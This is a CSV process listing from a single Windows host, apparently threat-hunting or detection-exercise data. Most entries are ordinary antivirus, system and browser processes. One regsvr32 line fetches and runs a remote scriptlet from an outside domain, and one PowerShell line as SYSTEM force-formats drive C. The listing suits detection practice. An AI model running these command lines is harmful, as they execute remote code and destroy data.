hostname,name,arguments,username,path,pid
SL457VRJ,mcshield.exe,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",zacha.sanch61,C:\Program Files\Common Files\McAfee\AMCore,1077
SL457VRJ,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,NT AUTHORITY\SYSTEM,C:\Windows\system32,2032
SL457VRJ,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -service",roby.edwar93,C:\Program Files\TightVNC,1914
SL457VRJ,Explorer.EXE,C:\Windows\Explorer.EXE,NT AUTHORITY\SYSTEM,C:\Windows,3372
SL457VRJ,SearchUI.exe,"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",NT AUTHORITY\SYSTEM,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,6472
SL457VRJ,svchost.exe,C:\Windows\system32\svchost.exe -k UnistackSvcGroup,NT AUTHORITY\SYSTEM,C:\Windows\system32,5100
SL457VRJ,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -controlservice -slave",roby.edwar93,C:\Program Files\TightVNC,5330
SL457VRJ,KeePassXC.exe,"""C:\Program Files\KeePassXC\KeePassXC.exe"" ",zacha.sanch61,C:\Program Files\KeePassXC,4335
SL457VRJ,taskhostw.exe,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},NT AUTHORITY\SYSTEM,C:\Windows\System32,3324
SL457VRJ,svchost.exe,C:\Windows\system32\svchost.exe -k LocalService,NT AUTHORITY\SYSTEM,C:\Windows\system32,1720
SL457VRJ,modulecoreservice.exe,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",zacha.sanch61,c:\program files\common files\mcafee\modulecore,5972
SL457VRJ,MMSSHOST.EXE,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",zacha.sanch61,C:\Program Files\Common Files\McAfee\MMSSHost,4221
SL457VRJ,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,784
SL457VRJ,McPvTray.exe,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",zacha.sanch61,C:\Program Files\McAfee\MAT,1464
SL457VRJ,SkypeBackgroundHost.exe,"""C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.33.41.0_x64__kzf8qxf38zg5c\SkypeBackgroundHost.exe"" -ServerName:SkypeBackgroundHost",roby.edwar93,C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.33.41.0_x64__kzf8qxf38zg5c,5044
SL457VRJ,svchost.exe,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,4276
SL457VRJ,ShellExperienceHost.exe,"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",NT AUTHORITY\SYSTEM,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,5200
SL457VRJ,McCSPServiceHost.exe,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",zacha.sanch61,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,3893
SL457VRJ,MpCmdRun.exe,"""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SpyNetServiceDss -RestrictPrivileges -AccessKey 5BDCBEBD-E077-6957-0484-82901932C7EC -Reinvoke",NT AUTHORITY\SYSTEM,C:\Program Files\Windows Defender,2576
SL457VRJ,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,6492
SL457VRJ,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkService,NT AUTHORITY\SYSTEM,C:\Windows\system32,3400
SL457VRJ,ServiceHost.exe,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",zacha.sanch61,C:\Program Files\McAfee\WebAdvisor,3049
SL457VRJ,MicrosoftEdgeCP.exe,"""C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe"" -ServerName:ContentProcess.AppX6z3cwk4fvgady6zya12j1cw28d228a7k.mca",zacha.sanch61,C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe,368
SL457VRJ,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,NT AUTHORITY\SYSTEM,C:\Windows\system32,4032
SL457VRJ,sihost.exe,sihost.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,892
SL457VRJ,svchost.exe,C:\Windows\System32\svchost.exe -k smbsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,4952
SL457VRJ,msdtc.exe,C:\Windows\System32\msdtc.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,2108
SL457VRJ,svchost.exe,C:\Windows\System32\svchost.exe -k termsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,4168
SL457VRJ,spoolsv.exe,C:\Windows\System32\spoolsv.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,1640
SL457VRJ,svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch,NT AUTHORITY\SYSTEM,C:\Windows\system32,1780
SL457VRJ,McApExe.exe,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",zacha.sanch61,C:\Program Files\Common Files\McAfee\VSCore_18_6,2823
SL457VRJ,dllhost.exe,C:\Windows\system32\dllhost.exe /Processid:{A7CCA429-5F8F-4A5B-B524-82C38D561286},NT AUTHORITY\SYSTEM,C:\Windows\system32,1924
SL457VRJ,MFEAvSvc.exe,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",zacha.sanch61,C:\Program Files\McAfee\MfeAV,3143
SL457VRJ,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,NT AUTHORITY\SYSTEM,C:\Windows\system32,3732
SL457VRJ,McDiReg.exe,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",zacha.sanch61,C:\ProgramData\McAfee\Direct,4217
SL457VRJ,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,6356
SL457VRJ,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,20
SL457VRJ,McAMTaskAgent.exe,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",zacha.sanch61,C:\Program Files\Common Files\McAfee\TaskScheduler,2009
SL457VRJ,mcuicnt.exe,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",zacha.sanch61,C:\Program Files\Common Files\mcafee\Platform,2456
SL457VRJ,svchost.exe,C:\Windows\System32\svchost.exe -k utcsvc,NT AUTHORITY\SYSTEM,C:\Windows\System32,2700
SL457VRJ,PEFService.exe,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",zacha.sanch61,C:\Program Files\Common Files\McAfee\PEF\CORE,2022
SL457VRJ,svchost.exe,C:\Windows\system32\svchost.exe -k appmodel,NT AUTHORITY\SYSTEM,C:\Windows\system32,596
SL457VRJ,svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,600
SL457VRJ,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,1084
SL457VRJ,OneDrive.exe,"""C:\Users\elsie.mart7\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",elsie.mart7,C:\Users\elsie.mart7\AppData\Local\Microsoft\OneDrive,3273
SL457VRJ,vncviewer.exe,"""C:\Program Files\RealVNC\VNC Viewer\vncviewer.exe"" ",roby.edwar93,C:\Program Files\RealVNC\VNC Viewer,3671
SL457VRJ,mchost.exe,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",zacha.sanch61,C:\Program Files\Common Files\McAfee\Platform\Core,5178
SL457VRJ,LogonUI.exe,"""LogonUI.exe"" /flags:0x0 /state0:0xa3a5d855 /state1:0x41c64e6d",NT AUTHORITY\SYSTEM,C:\Windows\system32,4516
SL457VRJ,UIHost.exe,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",zacha.sanch61,C:\Program Files\McAfee\WebAdvisor,3158
SL457VRJ,lsass.exe,C:\Windows\system32\lsass.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,3416
SL457VRJ,mcafee_trial_setup_433.0207.3919_key.exe,"""C:\Users\zacha.sanch61\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",zacha.sanch61,C:\Users\zacha.sanch61\AppData\Local\Temp\scoped_dir9616_4071,2552
SL457VRJ,chrome.exe,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --type=renderer --field-trial-handle=1556 1270622256617353588 15561965010207222735 131072 --service-pipe-token=1352282089870284743 --lang=en-US --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --device-scale-factor=1 --num-raster-threads=3 --enable-main-frame-before-activation --service-request-channel-token=1352282089870284743 --renderer-client-id=45 --mojo-platform-channel-handle=7884 /prefetch:1",elsie.mart7,C:\Program Files (x86)\Google\Chrome\Application,1162
SL457VRJ,ModuleCoreService.exe,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,zacha.sanch61,c:\program files\common files\mcafee\modulecore,2083
SL457VRJ,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,zacha.sanch61,C:\ProgramData\McAfee\McInstruTrack,2466
SL457VRJ,regsvr32.exe,C:\Windows\System32\regsvr32 /u /n /s /i:http://avanska.com/generators/wdsutil8.sct scrobj.dll,zacha.sanch61,C:\Windows\System32\regsvr32.exe,4212
SL457VRJ,McDiReg.exe,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,zacha.sanch61,C:\ProgramData\McAfee\Direct,1126
SL457VRJ,RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding,NT AUTHORITY\SYSTEM,C:\Windows\System32,3864
SL457VRJ,notepad.exe,"""C:\Windows\system32\notepad.exe"" ",elsie.mart7,C:\Windows\system32,6132
SL457VRJ,dllhost.exe,C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},NT AUTHORITY\SYSTEM,C:\Windows\system32,3820
SL457VRJ,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\system32,528
SL457VRJ,TabTip32.exe,/loadhooks /Parent:0000000000001188,NT AUTHORITY\SYSTEM,C:\Program Files (x86)\Common Files\Microsoft Shared\Ink,1836
SL457VRJ,ProtectedModuleHost.exe,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",zacha.sanch61,C:\Program Files\Common Files\McAfee\ModuleCore,2806
SL457VRJ,svchost.exe,C:\Windows\system32\svchost.exe -k RPCSS,NT AUTHORITY\SYSTEM,C:\Windows\system32,5388
SL457VRJ,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\system32,5008
SL457VRJ,powershell.exe,"New-Partition -DiskNumber 1 -UseMaximumSize -AssignDriveLetter C | Format-Volume -DriveLetter C -FileSystemLabel ""New""-FileSystem NTFS -Full FOrce -Confirm:$false |",NT AUTHORITY\SYSTEM,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,724
